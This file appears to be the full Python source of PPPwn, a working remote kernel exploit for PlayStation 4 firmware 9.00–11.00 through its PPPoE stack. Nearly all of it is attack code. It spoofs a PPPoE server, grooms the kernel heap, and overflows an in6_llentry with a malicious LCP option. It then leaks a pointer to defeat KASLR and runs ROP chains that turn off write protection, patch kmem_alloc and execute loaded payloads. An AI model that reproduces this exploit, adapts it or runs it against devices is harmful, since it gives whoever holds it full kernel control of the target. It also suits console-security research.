#!/usr/bin/env python3
#
# Copyright (C) 2024 Andy Nguyen
#
# This software may be modified and distributed under the terms
# of the MIT license.  See the LICENSE file for details.

from argparse import ArgumentParser
from scapy.all import *
from scapy.layers.ppp import *
from struct import pack, unpack
from sys import exit
from time import sleep
from offsets import *

# PPPoE constants

PPPOE_TAG_HUNIQUE = 0x0103
PPPOE_TAG_ACOOKIE = 0x0104

PPPOE_CODE_PADI = 0x09
PPPOE_CODE_PADO = 0x07
PPPOE_CODE_PADR = 0x19
PPPOE_CODE_PADS = 0x65
PPPOE_CODE_PADT = 0xa7

ETHERTYPE_PPPOEDISC = 0x8863
ETHERTYPE_PPPOE = 0x8864

CONF_REQ = 1
CONF_ACK = 2
CONF_NAK = 3
CONF_REJ = 4
ECHO_REQ = 9
ECHO_REPLY = 10

# FreeBSD constants

NULL = 0

PAGE_SIZE = 0x4000

IDT_UD = 6
SDT_SYSIGT = 14
SEL_KPL = 0

CR0_PE = 0x00000001
CR0_MP = 0x00000002
CR0_EM = 0x00000004
CR0_TS = 0x00000008
CR0_ET = 0x00000010
CR0_NE = 0x00000020
CR0_WP = 0x00010000
CR0_AM = 0x00040000
CR0_NW = 0x20000000
CR0_CD = 0x40000000
CR0_PG = 0x80000000

CR0_ORI = CR0_PG | CR0_AM | CR0_WP | CR0_NE | CR0_ET | CR0_TS | CR0_MP | CR0_PE

VM_PROT_READ = 0x01
VM_PROT_WRITE = 0x02
VM_PROT_EXECUTE = 0x04

VM_PROT_ALL = (VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE)

LLE_STATIC = 0x0002
LLE_LINKED = 0x0040
LLE_EXCLUSIVE = 0x2000

LO_INITIALIZED = 0x00010000
LO_WITNESS = 0x00020000
LO_UPGRADABLE = 0x00200000
LO_DUPOK = 0x00400000

LO_CLASSSHIFT = 24

RW_UNLOCKED = 1
MTX_UNOWNED = 4

RW_INIT_FLAGS = ((4 << LO_CLASSSHIFT) | LO_INITIALIZED | LO_WITNESS |
                 LO_UPGRADABLE)
MTX_INIT_FLAGS = ((1 << LO_CLASSSHIFT) | LO_INITIALIZED | LO_WITNESS)

CALLOUT_RETURNUNLOCKED = 0x10

AF_INET6 = 28

IFT_ETHER = 0x6

ND6_LLINFO_NOSTATE = 0xfffe

# FreeBSD offsets

TARGET_SIZE = 0x100

PPPOE_SOFTC_SC_DEST = 0x24
PPPOE_SOFTC_SC_AC_COOKIE = 0x40
PPPOE_SOFTC_SIZE = 0x1c8

LLTABLE_LLTIFP = 0x110
LLTABLE_LLTFREE = 0x118

SOCKADDR_IN6_SIZE = 0x1c


def p8(val):
    return pack('<B', val & 0xff)


def p16(val):
    return pack('<H', val & 0xffff)


def p16be(val):
    return pack('>H', val & 0xffff)


def p32(val):
    return pack('<I', val & 0xffffffff)


def p32be(val):
    return pack('>I', val & 0xffffffff)


def p64(val):
    return pack('<Q', val & 0xffffffffffffffff)


def p64be(val):
    return pack('>Q', val & 0xffffffffffffffff)


class LcpEchoHandler(AsyncSniffer):

    def __init__(self, iface):
        self.s = conf.L2socket(iface=iface)
        super().__init__(opened_socket=self.s,
                         prn=self.handler,
                         filter='pppoes && !ip',
                         lfilter=lambda pkt: pkt.haslayer(PPP_LCP_Echo))

    def handler(self, pkt):
        self.s.send(
            Ether(src=pkt[Ether].dst, dst=pkt[Ether].src, type=ETHERTYPE_PPPOE)
            / PPPoE(sessionid=pkt[PPPoE].sessionid) / PPP() /
            PPP_LCP_Echo(code=ECHO_REPLY, id=pkt[PPP_LCP_Echo].id))


class Exploit():
    SPRAY_NUM = 0x1000
    PIN_NUM = 0x1000
    CORRUPT_NUM = 0x1

    HOLE_START = 0x400
    HOLE_SPACE = 0x10

    LCP_ID = 0x41
    IPCP_ID = 0x41

    SESSION_ID = 0xffff

    STAGE2_PORT = 9020

    SOURCE_MAC = '41:41:41:41:41:41'
    SOURCE_IPV4 = '41.41.41.41'
    SOURCE_IPV6 = 'fe80::4141:4141:4141:4141'

    TARGET_IPV4 = '42.42.42.42'

    BPF_FILTER = '(ip6) || (pppoed) || (pppoes && !ip)'

    def __init__(self, offs, iface, stage1, stage2):
        self.offs = offs
        self.iface = iface
        self.stage1 = stage1
        self.stage2 = stage2
        self.s = conf.L2socket(iface=self.iface, filter=self.BPF_FILTER)

    def kdlsym(self, addr):
        return self.kaslr_offset + addr

    def lcp_negotiation(self):
        print('[*] Sending LCP configure request...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
            PPP() / PPP_LCP(code=CONF_REQ, id=self.LCP_ID))

        print('[*] Waiting for LCP configure ACK...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
                    PPP_LCP_Configure].code == CONF_ACK:
                break

        print('[*] Waiting for LCP configure request...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
                    PPP_LCP_Configure].code == CONF_REQ:
                break

        print('[*] Sending LCP configure ACK...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
            PPP() / PPP_LCP(code=CONF_ACK, id=pkt[PPP_LCP_Configure].id))

    def ipcp_negotiation(self):
        print('[*] Sending IPCP configure request...')
        self.s.send(
            Ether(
                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
            / PPPoE(sessionid=self.SESSION_ID) / PPP() /
            PPP_IPCP(code=CONF_REQ,
                     id=self.IPCP_ID,
                     options=PPP_IPCP_Option_IPAddress(data=self.SOURCE_IPV4)))

        print('[*] Waiting for IPCP configure ACK...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
                    PPP_IPCP) and pkt[PPP_IPCP].code == CONF_ACK:
                break

        print('[*] Waiting for IPCP configure request...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
                    PPP_IPCP) and pkt[PPP_IPCP].code == CONF_REQ:
                break

        print('[*] Sending IPCP configure NAK...')
        self.s.send(
            Ether(
                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
            / PPPoE(sessionid=self.SESSION_ID) / PPP() /
            PPP_IPCP(code=CONF_NAK,
                     id=pkt[PPP_IPCP].id,
                     options=PPP_IPCP_Option_IPAddress(data=self.TARGET_IPV4)))

        print('[*] Waiting for IPCP configure request...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
                    PPP_IPCP) and pkt[PPP_IPCP].code == CONF_REQ:
                break

        print('[*] Sending IPCP configure ACK...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
            PPP() / PPP_IPCP(code=CONF_ACK,
                             id=pkt[PPP_IPCP].id,
                             options=pkt[PPP_IPCP].options))

    def ppp_negotation(self, cb=None):
        print('[*] Waiting for PADI...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
                    PPPoED) and pkt[PPPoED].code == PPPOE_CODE_PADI:
                break

        for tag in pkt[PPPoED][PPPoED_Tags].tag_list:
            if tag.tag_type == PPPOE_TAG_HUNIQUE:
                host_uniq = tag.tag_value

        self.pppoe_softc = unpack('<Q', host_uniq)[0]
        print('[+] pppoe_softc: {}'.format(hex(self.pppoe_softc)))

        self.target_mac = pkt[Ether].src
        print('[+] Target MAC: {}'.format(self.target_mac))

        self.source_mac = self.SOURCE_MAC

        if cb:
            ac_cookie = cb()
        else:
            ac_cookie = b''
        print('[+] AC cookie length: {}'.format(hex(len(ac_cookie))))

        print('[*] Sending PADO...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOEDISC) / PPPoED(code=PPPOE_CODE_PADO) /
            PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=ac_cookie) /
            PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=host_uniq))

        print('[*] Waiting for PADR...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
                    PPPoED) and pkt[PPPoED].code == PPPOE_CODE_PADR:
                break

        print('[*] Sending PADS...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOEDISC) /
            PPPoED(code=PPPOE_CODE_PADS, sessionid=self.SESSION_ID) /
            PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=host_uniq))

    def build_fake_ifnet(self):
        # Leak address
        # Upper bytes are encoded with SESSION_ID
        planted = (self.pppoe_softc + 0x07) & 0xffffffffffff
        self.source_mac = str2mac(planted.to_bytes(6, byteorder='little'))
        print('[+] Source MAC: {}'.format(self.source_mac))

        # Fake ifnet
        fake_ifnet = bytearray()

        fake_ifnet += b'A' * (0x48 - len(fake_ifnet))
        fake_ifnet += p64(NULL)  # if_addrhead
        fake_ifnet += b'A' * (0x70 - len(fake_ifnet))
        fake_ifnet += p16(0x0001)  # if_index
        fake_ifnet += b'A' * (0xa0 - len(fake_ifnet))
        fake_ifnet += p8(IFT_ETHER)  # ifi_type
        fake_ifnet += p8(0)  # ifi_physical
        fake_ifnet += p8(0x8 + 0x1)  # ifi_addrlen
        fake_ifnet += b'A' * (0x1b8 - len(fake_ifnet))
        fake_ifnet += p64(self.pppoe_softc + PPPOE_SOFTC_SC_DEST)  # if_addr
        fake_ifnet += b'A' * (0x428 - len(fake_ifnet))
        fake_ifnet += p64(self.pppoe_softc + 0x10 - 0x8)  # nd_ifinfo

        # if_afdata_lock
        fake_ifnet += b'A' * (0x480 - len(fake_ifnet))
        fake_ifnet += p64(NULL)  # lo_name
        fake_ifnet += p32(RW_INIT_FLAGS)  # lo_flags
        fake_ifnet += p32(0)  # lo_data
        fake_ifnet += p64(NULL)  # lo_witness
        fake_ifnet += p64(RW_UNLOCKED)  # rw_lock

        # if_addr_mtx
        fake_ifnet += b'A' * (0x4c0 - len(fake_ifnet))
        fake_ifnet += p64(NULL)  # lo_name
        fake_ifnet += p32(MTX_INIT_FLAGS)  # lo_flags
        fake_ifnet += p32(0)  # lo_data
        fake_ifnet += p64(NULL)  # lo_witness
        fake_ifnet += p64(MTX_UNOWNED)  # mtx_lock

        return fake_ifnet

    def build_overflow_lle(self):
        # Fake in6_llentry
        overflow_lle = bytearray()

        # lle_next
        overflow_lle += p64(self.pppoe_softc +
                            PPPOE_SOFTC_SC_AC_COOKIE)  # le_next
        overflow_lle += p64(NULL)  # le_prev

        # lle_lock
        overflow_lle += p64(NULL)  # lo_name
        overflow_lle += p32(RW_INIT_FLAGS | LO_DUPOK)  # lo_flags
        overflow_lle += p32(0)  # lo_data
        overflow_lle += p64(NULL)  # lo_witness
        overflow_lle += p64(RW_UNLOCKED)  # rw_lock

        overflow_lle += p64(self.pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE -
                            LLTABLE_LLTIFP)  # lle_tbl
        overflow_lle += p64(NULL)  # lle_head
        overflow_lle += p64(NULL)  # lle_free
        overflow_lle += p64(NULL)  # la_hold
        overflow_lle += p32(0)  # la_numheld
        overflow_lle += p32(0)  # pad
        overflow_lle += p64(0)  # la_expire
        overflow_lle += p16(LLE_EXCLUSIVE)  # la_flags
        overflow_lle += p16(0)  # la_asked
        overflow_lle += p16(0)  # la_preempt
        overflow_lle += p16(0)  # ln_byhint
        overflow_lle += p16(ND6_LLINFO_NOSTATE)  # ln_state
        overflow_lle += p16(0)  # ln_router
        overflow_lle += p32(0)  # pad
        overflow_lle += p64(0x7fffffffffffffff)  # ln_ntick

        return overflow_lle

    def build_fake_lle(self):
        # First gadget - must be a valid MAC address
        # Upper bytes are encoded with SESSION_ID
        planted = self.kdlsym(self.offs.FIRST_GADGET) & 0xffffffffffff
        self.source_mac = str2mac(planted.to_bytes(6, byteorder='little'))
        print('[+] Source MAC: {}'.format(self.source_mac))

        # Fake in6_llentry
        fake_lle = bytearray()

        # lle_next
        # Third gadget
        fake_lle += p64(
            self.kdlsym(self.offs.POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10)
        )  # le_next
        fake_lle += p64(NULL)  # le_prev

        # lle_lock
        # Fourth gadget
        fake_lle += p64(self.kdlsym(
            self.offs.LEA_RSP_RSI_20_REPZ_RET))  # lo_name
        fake_lle += p32(RW_INIT_FLAGS | LO_DUPOK)  # lo_flags
        fake_lle += p32(0)  # lo_data
        # Fifth gadget
        fake_lle += p64(self.kdlsym(
            self.offs.ADD_RSP_B0_POP_RBP_RET))  # lo_witness
        fake_lle += p64(RW_UNLOCKED)  # rw_lock

        fake_lle += p64(self.pppoe_softc + PPPOE_SOFTC_SC_DEST -
                        LLTABLE_LLTFREE)  # lle_tbl
        fake_lle += p64(NULL)  # lle_head
        fake_lle += p64(NULL)  # lle_free
        fake_lle += p64(NULL)  # la_hold
        fake_lle += p32(0)  # la_numheld
        fake_lle += p32(0)  # pad
        fake_lle += p64(0)  # la_expire
        fake_lle += p16(LLE_STATIC | LLE_EXCLUSIVE)  # la_flags
        fake_lle += p16(0)  # la_asked
        fake_lle += p16(0)  # la_preempt
        fake_lle += p16(0)  # ln_byhint
        fake_lle += p16(ND6_LLINFO_NOSTATE)  # ln_state
        fake_lle += p16(0)  # ln_router
        fake_lle += p32(0)  # pad
        fake_lle += p64(0x7fffffffffffffff)  # ln_ntick
        fake_lle += p32(0)  # lle_refcnt
        fake_lle += p32(0)  # pad
        fake_lle += p64be(0x414141414141)  # ll_addr

        # lle_timer
        fake_lle += p64(0)  # sle
        fake_lle += p64(0)  # tqe
        fake_lle += p32(0)  # c_time
        fake_lle += p32(0)  # pad
        fake_lle += p64(NULL)  # c_arg
        fake_lle += p64(NULL)  # c_func
        fake_lle += p64(NULL)  # c_lock
        fake_lle += p32(CALLOUT_RETURNUNLOCKED)  # c_flags
        fake_lle += p32(0)  # c_cpu

        # l3_addr6
        fake_lle += p8(SOCKADDR_IN6_SIZE)  # sin6_len
        fake_lle += p8(AF_INET6)  # sin6_family
        fake_lle += p16(0)  # sin6_port
        fake_lle += p32(0)  # sin6_flowinfo
        # sin6_addr
        fake_lle += p64be(0xfe80000100000000)
        fake_lle += p64be(0x4141414141414141)
        fake_lle += p32(0)  # sin6_scope_id

        # pad
        fake_lle += p32(0)

        # Second gadget
        fake_lle[self.offs.SECOND_GADGET_OFF:(
            self.offs.SECOND_GADGET_OFF + 8)] = p64(
                self.kdlsym(self.offs.PUSH_RBP_JMP_QWORD_PTR_RSI))

        # Second ROP chain
        rop2 = self.build_second_rop()

        # First ROP chain
        rop = self.build_first_rop(fake_lle, rop2)

        return fake_lle + rop + rop2 + self.stage1

    def build_first_rop(self, fake_lle, rop2):
        rop = bytearray()

        # memcpy(RBX - 0x800, rop2, len(rop2 + stage1))

        # RDI = RBX - 0x800
        rop += p64(self.kdlsym(self.offs.POP_R12_RET))
        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
        rop += p64(self.kdlsym(self.offs.MOV_RDI_RBX_CALL_R12))
        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
        rop += p64(-0x800)
        rop += p64(self.kdlsym(self.offs.ADD_RDI_RCX_RET))

        # RSI += len(fake_lle + rop)
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop_off_fixup = len(rop)
        rop += p64(0xDEADBEEF)
        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
        rop += p64(0xDEADBEEF)

        # RDX = len(rop2 + stage1)
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop += p64(len(rop2 + self.stage1))

        # Call memcpy
        rop += p64(self.kdlsym(self.offs.MEMCPY))

        # Stack pivot
        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
        rop += p64(self.kdlsym(self.offs.MOV_RSI_RBX_CALL_RAX))
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop += p64(0x800 + 0x20)
        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
        rop += p64(0xDEADBEEF)
        rop += p64(self.kdlsym(self.offs.LEA_RSP_RSI_20_REPZ_RET))

        # Fixup offset of rop2
        rop[rop_off_fixup:rop_off_fixup + 8] = p64(-len(fake_lle + rop))

        return rop

    def build_second_rop(self):
        rop = bytearray()

        # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
        rop += p64(IDT_UD)
        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
        rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop += p64(SDT_SYSIGT)
        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
        rop += p64(SEL_KPL)
        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
        rop += p64(0)
        rop += p64(0xDEADBEEF)
        rop += p64(self.kdlsym(self.offs.SETIDT))

        # Disable write protection
        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
        rop += p64(CR0_ORI & ~CR0_WP)
        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))

        # Enable RWX in kmem_alloc
        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
        rop += p64(VM_PROT_ALL)
        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH1))
        rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))
        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH2))
        rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))

        # Restore write protection
        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
        rop += p64(CR0_ORI)
        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))

        # kmem_alloc(*kernel_map, PAGE_SIZE)

        # RDI = *kernel_map
        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
        rop += p64(self.kdlsym(self.offs.RET))
        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
        rop += p64(self.kdlsym(self.offs.KERNEL_MAP))
        rop += p64(self.kdlsym(self.offs.MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX))
        rop += p64(0xDEADBEEF)

        # RSI = PAGE_SIZE
        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
        rop += p64(PAGE_SIZE)

        # Call kmem_alloc
        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC))

        # R14 = RAX
        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
        rop += p64(0xDEADBEEF)
        rop += p64(self.kdlsym(self.offs.MOV_R14_RAX_CALL_R8))

        # memcpy(R14, stage1, len(stage1))

        # RDI = R14
        rop += p64(self.kdlsym(self.offs.POP_R12_RET))
        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
        rop += p64(self.kdlsym(self.offs.MOV_RDI_R14_CALL_R12))

        # RSI = RSP + len(rop) - rop_rsp_pos
        rop += p64(self.kdlsym(self.offs.PUSH_RSP_POP_RSI_RET))
        rop_rsp_pos = len(rop)
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop_off_fixup = len(rop)
        rop += p64(0xDEADBEEF)
        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
        rop += p64(0xDEADBEEF)

        # RDX = len(stage1)
        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
        rop += p64(len(self.stage1))

        # Call memcpy
        rop += p64(self.kdlsym(self.offs.MEMCPY))

        # Jump into stage1
        rop += p64(self.kdlsym(self.offs.JMP_R14))

        # Fixup offset of stage1
        rop[rop_off_fixup:rop_off_fixup + 8] = p64(-(len(rop) - rop_rsp_pos))

        return rop

    def run(self):
        lcp_echo_handler = LcpEchoHandler(self.iface)
        lcp_echo_handler.start()

        print('')
        print('[+] STAGE 0: Initialization')

        self.ppp_negotation(self.build_fake_ifnet)
        self.lcp_negotiation()
        self.ipcp_negotiation()

        print('[*] Waiting for interface to be ready...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(ICMPv6ND_RS):
                break

        self.target_ipv6 = pkt[IPv6].src
        print('[+] Target IPv6: {}'.format(self.target_ipv6))

        for i in range(self.SPRAY_NUM):
            if i % 0x100 == 0:
                print('[*] Heap grooming...{}%'.format(100 * i //
                                                       self.SPRAY_NUM),
                      end='\r',
                      flush=True)

            source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)

            self.s.send(
                Ether(src=self.source_mac, dst=self.target_mac) /
                IPv6(src=source_ipv6, dst=self.target_ipv6) /
                ICMPv6EchoRequest())

            while True:
                pkt = self.s.recv()
                if pkt and pkt.haslayer(ICMPv6ND_NS):
                    break

            if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
                continue

            self.s.send(
                Ether(src=self.source_mac, dst=self.target_mac) /
                IPv6(src=source_ipv6, dst=self.target_ipv6) /
                ICMPv6ND_NA(tgt=source_ipv6, S=1) /
                ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))

        print('[+] Heap grooming...done')

        print('')
        print('[+] STAGE 1: Memory corruption')

        # Send invalid packet to trigger a printf in the kernel. For some
        # reason, this causes scheduling on CPU 0 at some point, which makes
        # the next allocation use the same per-CPU cache.
        for i in range(self.PIN_NUM):
            if i % 0x100 == 0:
                print('[*] Pinning to CPU 0...{}%'.format(100 * i //
                                                          self.PIN_NUM),
                      end='\r',
                      flush=True)

            self.s.send(
                Ether(src=self.source_mac,
                      dst=self.target_mac,
                      type=ETHERTYPE_PPPOE))
            sleep(0.001)

        print('[+] Pinning to CPU 0...done')

        # LCP fails sometimes without the wait
        sleep(1)

        # Corrupt in6_llentry object
        overflow_lle = self.build_overflow_lle()
        print('[*] Sending malicious LCP configure request...')
        for i in range(self.CORRUPT_NUM):
            self.s.send(
                Ether(src=self.source_mac,
                      dst=self.target_mac,
                      type=ETHERTYPE_PPPOE) / PPPoE(sessionid=self.SESSION_ID) /
                PPP() / PPP_LCP(code=CONF_REQ,
                                id=self.LCP_ID,
                                len=TARGET_SIZE + 4,
                                data=(PPP_LCP_Option(data=b'A' *
                                                     (TARGET_SIZE - 4)) /
                                      PPP_LCP_Option(data=overflow_lle))))

        print('[*] Waiting for LCP configure reject...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
                    PPP_LCP_Configure].code == CONF_REJ:
                break

        # Re-negotiate after rejection
        self.lcp_negotiation()
        self.ipcp_negotiation()

        corrupted = False
        for i in reversed(range(self.SPRAY_NUM)):
            if i % 0x100 == 0:
                print('[*] Scanning for corrupted object...{}'.format(hex(i)),
                      end='\r',
                      flush=True)

            if i >= self.HOLE_START and i % self.HOLE_SPACE == 0:
                continue

            source_ipv6 = 'fe80::{:04x}:4141:4141:4141'.format(i)

            self.s.send(
                Ether(src=self.source_mac, dst=self.target_mac) /
                IPv6(src=source_ipv6, dst=self.target_ipv6) /
                ICMPv6EchoRequest())

            while True:
                pkt = self.s.recv()
                if pkt:
                    if pkt.haslayer(ICMPv6EchoReply):
                        break
                    elif pkt.haslayer(ICMPv6ND_NS):
                        corrupted = True
                        break

            if corrupted:
                break

            self.s.send(
                Ether(src=self.source_mac, dst=self.target_mac) /
                IPv6(src=source_ipv6, dst=self.target_ipv6) /
                ICMPv6ND_NA(tgt=source_ipv6, S=1) /
                ICMPv6NDOptDstLLAddr(lladdr=self.source_mac))

        if not corrupted:
            print('[-] Scanning for corrupted object...failed. Please retry.')
            exit(1)

        print(
            '[+] Scanning for corrupted object...found {}'.format(source_ipv6))

        print('')
        print('[+] STAGE 2: KASLR defeat')

        print('[*] Defeating KASLR...')
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(
                    ICMPv6NDOptSrcLLAddr) and pkt[ICMPv6NDOptSrcLLAddr].len > 1:
                break

        self.pppoe_softc_list = unpack('<Q', bytes(pkt[IPv6])[0x43:0x4b])[0]
        print('[+] pppoe_softc_list: {}'.format(hex(self.pppoe_softc_list)))

        self.kaslr_offset = self.pppoe_softc_list - self.offs.PPPOE_SOFTC_LIST
        print('[+] kaslr_offset: {}'.format(hex(self.kaslr_offset)))

        if (self.pppoe_softc_list & 0xffffffff00000fff
                != self.offs.PPPOE_SOFTC_LIST & 0xffffffff00000fff):
            print('[-] Error leak is invalid. Wrong firmware?')
            exit(1)

        print('')
        print('[+] STAGE 3: Remote code execution')

        print('[*] Sending LCP terminate request...')
        self.s.send(
            Ether(
                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
            / PPPoE(sessionid=self.SESSION_ID) / PPP() / PPP_LCP_Terminate())

        self.ppp_negotation(self.build_fake_lle)

        print('[*] Triggering code execution...')
        self.s.send(
            Ether(src=self.source_mac, dst=self.target_mac) /
            IPv6(src=self.SOURCE_IPV6, dst=self.target_ipv6) /
            ICMPv6EchoRequest())

        print('[*] Waiting for stage1 to resume...')
        count = 0
        while count < 3:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[
                    PPP_LCP_Configure].code == CONF_REQ:
                count += 1

        print('[*] Sending PADT...')
        self.s.send(
            Ether(src=self.source_mac,
                  dst=self.target_mac,
                  type=ETHERTYPE_PPPOEDISC) /
            PPPoED(code=PPPOE_CODE_PADT, sessionid=self.SESSION_ID))

        self.ppp_negotation()
        self.lcp_negotiation()
        self.ipcp_negotiation()

        print('')
        print('[+] STAGE 4: Arbitrary payload execution')

        print('[*] Sending stage2 payload...')
        frags = fragment(
            IP(src=self.SOURCE_IPV4, dst=self.TARGET_IPV4) /
            UDP(dport=self.STAGE2_PORT) / self.stage2, 1024)

        for frag in frags:
            self.s.send(Ether(src=self.source_mac, dst=self.target_mac) / frag)

        print('[+] Done!')


def main():
    parser = ArgumentParser('pppwn.py')
    parser.add_argument('--interface', required=True)
    parser.add_argument('--fw',
                        choices=[
                            '900', '903', '904', '950', '960', '1000', '1001',
                            '1050', '1070', '1071', '1100'
                        ],
                        default='1100')
    parser.add_argument('--stage1', default='stage1/stage1.bin')
    parser.add_argument('--stage2', default='stage2/stage2.bin')
    args = parser.parse_args()

    print('[+] PPPwn - PlayStation 4 PPPoE RCE by theflow')
    print('[+] args: ' + ' '.join(f'{k}={v}' for k, v in vars(args).items()))

    with open(args.stage1, mode='rb') as f:
        stage1 = f.read()

    with open(args.stage2, mode='rb') as f:
        stage2 = f.read()

    if args.fw == '900':
        offs = OffsetsFirmware_900()
    elif args.fw in ('903', '904'):
        offs = OffsetsFirmware_903_904()
    elif args.fw in ('950', '960'):
        offs = OffsetsFirmware_950_960()
    elif args.fw in ('1000', '1001'):
        offs = OffsetsFirmware_1000_1001()
    elif args.fw in ('1050', '1070', '1071'):
        offs = OffsetsFirmware_1050_1071()
    elif args.fw == '1100':
        offs = OffsetsFirmware_1100()

    exploit = Exploit(offs, args.interface, stage1, stage2)
    exploit.run()

    return 0


if __name__ == '__main__':
    exit(main())
